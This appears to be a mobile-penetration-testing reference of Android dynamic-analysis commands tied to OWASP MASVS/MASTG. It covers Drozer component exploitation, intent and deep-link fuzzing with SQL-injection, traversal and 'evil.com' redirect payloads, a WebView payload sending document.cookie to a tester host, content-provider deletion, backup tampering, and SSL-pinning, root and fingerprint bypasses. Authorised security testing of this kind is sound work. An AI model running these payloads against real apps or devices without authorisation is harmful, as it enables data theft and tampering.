# Dynamic Analysis Reference

**MASVS:** MASVS-STORAGE, MASVS-AUTH, MASVS-PLATFORM, MASVS-RESILIENCE
**MASTG Tests:** MASTG-TEST-0031 through MASTG-TEST-0075 (Android Dynamic)
**OWASP:** M3, M4, M8, M9

## Table of Contents
1. [ADB Shell Enumeration](#adb-enum)
2. [Logcat Monitoring](#logcat)
3. [Component Exploitation — Drozer](#drozer)
4. [Intent Fuzzing](#intents)
5. [Content Provider Testing](#providers)
6. [Broadcast Receiver Testing](#receivers)
7. [Deep Link Fuzzing](#deeplinks)
8. [Runtime Analysis — Objection](#objection)
9. [Backup Extraction](#backup)
10. [Tapjacking / Task Hijacking](#tapjack)
11. [Screenshot & Evidence Collection](#evidence)

---

## 1. ADB Shell Enumeration <a name="adb-enum"></a>

```bash
# Connect and verify [BOTH]
adb devices -l
adb shell

# App data directory [ROOTED]
adb shell su -c "ls -la /data/data/[TARGET_PACKAGE]/"

# App data with run-as (debuggable only) [UNROOTED]
adb shell run-as [TARGET_PACKAGE] ls -la

# Package info [BOTH]
adb shell dumpsys package [TARGET_PACKAGE]
adb shell pm dump [TARGET_PACKAGE]

# Running services [BOTH]
adb shell dumpsys activity services [TARGET_PACKAGE]

# App memory info [BOTH]
adb shell dumpsys meminfo [TARGET_PACKAGE]

# Network connections [ROOTED]
adb shell su -c "ss -tunp | grep [TARGET_PID]"
adb shell su -c "cat /proc/[TARGET_PID]/net/tcp"

# File descriptors (detect open sockets/files) [ROOTED]
adb shell su -c "ls -la /proc/[TARGET_PID]/fd"

# Check if app is debuggable [BOTH]
adb shell getprop ro.debuggable
adb shell am get-config | grep debuggable

# App user ID [BOTH]
adb shell id -u [TARGET_PACKAGE] 2>/dev/null || \
  adb shell pm list packages -U | grep [TARGET_PACKAGE]
```

---

## 2. Logcat Monitoring <a name="logcat"></a>

```bash
# Full logcat with package filter [BOTH]
adb logcat --pid=$(adb shell pidof [TARGET_PACKAGE]) | tee -a braindump/session_log.md

# Filter for sensitive data patterns [BOTH]
adb logcat | tee /tmp/logcat.txt | \
  grep -iE 'password|token|secret|key|auth|credential|email|phone|ssn|credit'

# Filter by app tag [BOTH]
adb logcat -s [APP_TAG]:V

# Clear logcat, then trigger action, then dump [BOTH]
adb logcat -c
# [trigger app action]
adb logcat -d > logcat-action.txt

# Watch for stack traces (crash logs expose internals) [BOTH]
adb logcat | grep -E 'AndroidRuntime|FATAL|Exception|Error'

# Monitor HTTP traffic via OkHttp logs [BOTH]
adb logcat | grep -E 'OkHttp|retrofit|okhttp'

# Monitor Frida output alongside logcat [BOTH]
adb logcat &
frida -U -f [TARGET_PACKAGE] -l [FRIDA_SCRIPT] --no-pause 2>&1 | \
  tee -a braindump/session_log.md
```

---

## 3. Component Exploitation — Drozer <a name="drozer"></a>

```bash
# Setup [BOTH]
adb forward tcp:31415 tcp:31415
# Install drozer agent APK on device
adb install drozer-agent.apk
# Enable agent on device, then:
drozer console connect

# Full attack surface [BOTH]
dz> run app.package.attacksurface [TARGET_PACKAGE]
# Output: X activities exported, Y providers, Z services, W receivers

# List all exported activities [BOTH]
dz> run app.activity.info -a [TARGET_PACKAGE]

# Launch exported activity [BOTH]
dz> run app.activity.start --component [TARGET_PACKAGE] [ACTIVITY_CLASSNAME]
# With extras:
dz> run app.activity.start --component [TARGET_PACKAGE] [ACTIVITY_CLASSNAME] \
    --extra string "key" "value" \
    --extra boolean "isAdmin" true

# List exported services [BOTH]
dz> run app.service.info -a [TARGET_PACKAGE]

# Start/stop service [BOTH]
dz> run app.service.start --component [TARGET_PACKAGE] [SERVICE_NAME]
dz> run app.service.stop --component [TARGET_PACKAGE] [SERVICE_NAME]

# List exported receivers [BOTH]
dz> run app.broadcast.info -a [TARGET_PACKAGE]

# Send broadcast [BOTH]
dz> run app.broadcast.send --component [TARGET_PACKAGE] [RECEIVER_NAME] \
    --action [ACTION_NAME]

# List providers [BOTH]
dz> run app.provider.info -a [TARGET_PACKAGE]

# Find all URIs accessible [BOTH]
dz> run scanner.provider.finduris -a [TARGET_PACKAGE]

# Query provider [BOTH]
dz> run app.provider.query content://[AUTHORITY]/[PATH]
dz> run app.provider.query content://[AUTHORITY]/[PATH] --projection "* FROM sqlite_master--"

# SQL injection scan [BOTH]
dz> run scanner.provider.injection -a [TARGET_PACKAGE]

# Directory traversal scan [BOTH]
dz> run scanner.provider.traversal -a [TARGET_PACKAGE]

# Check for accessible file providers [BOTH]
dz> run scanner.provider.finduris -a [TARGET_PACKAGE]
dz> run app.provider.read content://[AUTHORITY]/[TRAVERSAL_PATH]

# Intent redirection / StrandHogg [BOTH]
dz> run app.activity.forintent --action android.intent.action.VIEW \
    --data-uri "content://[TARGET_PACKAGE].provider"
```

---

## 4. Intent Fuzzing <a name="intents"></a>

```bash
# Launch activity with various extras [BOTH]
adb shell am start -n [TARGET_PACKAGE]/[ACTIVITY] \
  --es "url" "http://evil.com" \
  --es "token" "injected" \
  --ez "isAdmin" true \
  --ei "userId" 0

# Deep link with parameter fuzzing [BOTH]
for payload in "' OR 1=1--" "<script>alert(1)</script>" "../../../etc/passwd" "null" ""; do
  adb shell am start -a android.intent.action.VIEW \
    -d "myapp://target?param=$(python3 -c \"import urllib.parse; print(urllib.parse.quote('$payload'))\")"
  sleep 1
done

# Send broadcast with injected data [BOTH]
adb shell am broadcast -a com.example.ACTION_UPDATE \
  --es "data" "injected_value" \
  -n [TARGET_PACKAGE]/[RECEIVER_CLASSNAME]

# Start service with injected command [BOTH]
adb shell am startservice -n [TARGET_PACKAGE]/[SERVICE_CLASSNAME] \
  --es "cmd" "injected" \
  --ei "priority" 9999

# Test implicit intents — what app handles what [BOTH]
adb shell am start -a android.intent.action.VIEW \
  -t "application/pdf" \
  -d "content://[TARGET_PACKAGE].provider/documents/secret.pdf"

# Pending intent exploitation — send to exported activity [BOTH]
# If app uses PendingIntent without FLAG_IMMUTABLE, can inject extras
```

---

## 5. Content Provider Testing <a name="providers"></a>

```bash
# Query all URIs [BOTH]
adb shell content query --uri content://[AUTHORITY]/[PATH]

# Attempt SQL injection in WHERE clause [BOTH]
adb shell content query \
  --uri content://[AUTHORITY]/users \
  --where "1=1 UNION SELECT name,sql,NULL FROM sqlite_master--"

# Attempt directory traversal via file provider [BOTH]
adb shell content query \
  --uri "content://[TARGET_PACKAGE].provider/root/../../../data/data/[TARGET_PACKAGE]/databases/main.db"

# Read file via file provider [BOTH]
adb shell content read \
  --uri "content://[TARGET_PACKAGE].provider/files/config.json"

# Insert data (test for injection) [BOTH]
adb shell content insert \
  --uri content://[AUTHORITY]/users \
  --bind name:s:"admin" \
  --bind role:s:"admin"

# Update data [BOTH]
adb shell content update \
  --uri content://[AUTHORITY]/users \
  --bind role:s:"admin" \
  --where "id=?" --arg "1"

# Delete data [BOTH]
adb shell content delete \
  --uri content://[AUTHORITY]/users \
  --where "1=1"

# Drozer provider scan [BOTH]
dz> run scanner.provider.injection -a [TARGET_PACKAGE]
dz> run scanner.provider.traversal -a [TARGET_PACKAGE]
dz> run app.provider.query content://[AUTHORITY] --vertical
```

---

## 6. Broadcast Receiver Testing <a name="receivers"></a>

```bash
# Send broadcast to exported receiver [BOTH]
adb shell am broadcast \
  -a android.intent.action.BOOT_COMPLETED \
  -n [TARGET_PACKAGE]/[RECEIVER_CLASSNAME]

# Custom action broadcast [BOTH]
adb shell am broadcast \
  -a "com.example.SECRET_ACTION" \
  --es "data" "test"

# Test for ordered broadcast interception [BOTH]
# Register receiver with higher priority via drozer:
dz> run app.broadcast.sniff --action [ACTION]

# Common sensitive broadcasts to test [BOTH]
adb shell am broadcast -a android.intent.action.PACKAGE_REPLACED \
  -d package:[TARGET_PACKAGE]
adb shell am broadcast -a android.intent.action.MY_PACKAGE_REPLACED \
  -n [TARGET_PACKAGE]/[RECEIVER]
```

---

## 7. Deep Link Fuzzing <a name="deeplinks"></a>

```bash
# Extract all schemes from manifest [BOTH]
grep -E 'android:scheme|android:host|android:pathPrefix' \
  [TARGET_PACKAGE]-decoded/AndroidManifest.xml

# Fuzzing script [BOTH]
SCHEME="myapp"  # replace with actual scheme
HOSTS=("target" "admin" "internal" "debug" "test")
PATHS=("/login" "/admin" "/user" "/settings" "/debug" "/api" "/redirect")
PARAMS=("token=test" "user=admin" "id=1" "redirect=http://evil.com" \
        "url=javascript:alert(1)" "file=../../../data/data/[TARGET_PACKAGE]/databases/main.db")

for host in "${HOSTS[@]}"; do
  for path in "${PATHS[@]}"; do
    for param in "${PARAMS[@]}"; do
      uri="${SCHEME}://${host}${path}?${param}"
      echo "[*] Testing: $uri"
      adb shell am start -a android.intent.action.VIEW -d "$uri" 2>/dev/null
      sleep 0.5
    done
  done
done

# Test http/https deep links [BOTH]
adb shell am start -a android.intent.action.VIEW \
  -d "https://app.target.com/internal/admin?token=bypass"

# Check for open redirect [BOTH]
adb shell am start -a android.intent.action.VIEW \
  -d "${SCHEME}://auth/callback?redirect_uri=http://evil.com"

# Check for JS execution in WebView via deep link [BOTH]
adb shell am start -a android.intent.action.VIEW \
  -d "${SCHEME}://webview?url=javascript:fetch('http://[BURP_IP]/'+document.cookie)"
```

---

## 8. Runtime Analysis — Objection <a name="objection"></a>

```bash
# Connect [BOTH] (gadget on unrooted, direct on rooted)
objection -g [TARGET_PACKAGE] explore

# --- In objection REPL ---

# Environment and paths
env

# File system
android file ls                    # list /data/data/[pkg]/
android file ls --path /sdcard/
android file download [path] [local]

# SSL pinning bypass
android sslpinning disable

# Root detection bypass
android root disable

# List all classes
android hooking list classes

# List methods of a class
android hooking list class_methods com.example.app.MainActivity

# Watch method calls (args + return)
android hooking watch class_method \
  com.example.app.AuthManager.checkToken \
  --dump-args --dump-return --dump-backtrace

# Hook all methods of a class
android hooking watch class com.example.app.CryptoUtils --dump-args --dump-return

# Dump keystore
android keystore list

# Dump SharedPreferences
android preferences get --package [TARGET_PACKAGE]

# Search memory
memory search "4e61 6d65" --string

# List modules in memory
memory list modules

# Clipboard monitor
android clipboard monitor

# Screenshot
android ui screenshot /tmp/screenshot.png

# Intent monitoring
android intents start_activity com.example.app.MainActivity

# Dump heap
android heap print-instances com.example.app.Session

# Search class instances
android heap search instances com.example.app.Token

# Job scheduler dump
android job_scheduler list

# Fingerprint bypass
android fingerprint bypass
```

---

## 9. Backup Extraction <a name="backup"></a>

```bash
# Full backup (if allowBackup=true) [BOTH]
adb backup -f backup.ab -noapk [TARGET_PACKAGE]
# Enter "Back up my data" on device prompt

# Convert backup to tar [BOTH]
dd if=backup.ab bs=1 skip=24 | \
  python3 -c "import zlib,sys; sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read()))" \
  > backup.tar

# Extract [BOTH]
mkdir backup-extracted && tar xvf backup.tar -C backup-extracted/

# Search for sensitive data [BOTH]
find backup-extracted/ -type f | xargs grep -li 'password\|token\|secret\|auth' 2>/dev/null
find backup-extracted/ -name "*.xml" -o -name "*.db" -o -name "*.json"

# View SQLite databases from backup [BOTH]
sqlite3 backup-extracted/apps/[TARGET_PACKAGE]/db/main.db ".tables"

# Restore modified backup (inject data) [BOTH]
# Modify a file in backup-extracted/
tar cvf backup-modified.tar backup-extracted/
# Compress and prepend header:
python3 -c "
import zlib, sys, struct
data = open('backup-modified.tar','rb').read()
compressed = zlib.compress(data, 9)
header = b'ANDROID BACKUP\n5\n1\nnone\n'
sys.stdout.buffer.write(header + compressed)
" > backup-modified.ab
adb restore backup-modified.ab
```

---

## 10. Tapjacking / Task Hijacking <a name="tapjack"></a>

```bash
# Tapjacking: overlay transparent activity on top of target [BOTH]
# See references/poc-app-creation.md for PoC app templates

# Check if target has filterTouchesWhenObscured [BOTH]
rg -n 'filterTouchesWhenObscured\|setFilterTouchesWhenObscured' [TARGET_PACKAGE]-jadx/

# Task hijacking (StrandHogg 1.0) — check launchMode [BOTH]
grep -E 'android:launchMode' [TARGET_PACKAGE]-decoded/AndroidManifest.xml
# singleTask or singleInstance + allowTaskReparenting = exploitable

# StrandHogg 1.0 detection [BOTH]
grep -E 'allowTaskReparenting="true"' [TARGET_PACKAGE]-decoded/AndroidManifest.xml

# Check taskAffinity [BOTH]
grep -E 'android:taskAffinity' [TARGET_PACKAGE]-decoded/AndroidManifest.xml
```

---

## 11. Screenshot & Evidence Collection <a name="evidence"></a>

```bash
# Mirror device screen [BOTH]
scrcpy -s [DEVICE_ID] --record evidence/poc-$(date +%Y%m%d-%H%M%S).mp4

# Single screenshot [BOTH]
adb exec-out screencap -p > evidence/screenshot-$(date +%Y%m%d-%H%M%S).png

# Record screen [BOTH]
adb shell screenrecord /sdcard/poc.mp4 &
# ... do your PoC ...
adb shell kill %1
adb pull /sdcard/poc.mp4 evidence/

# Logcat snapshot [BOTH]
adb logcat -d > evidence/logcat-$(date +%Y%m%d-%H%M%S).txt

# All evidence → log to braindump/poc_log.md
```
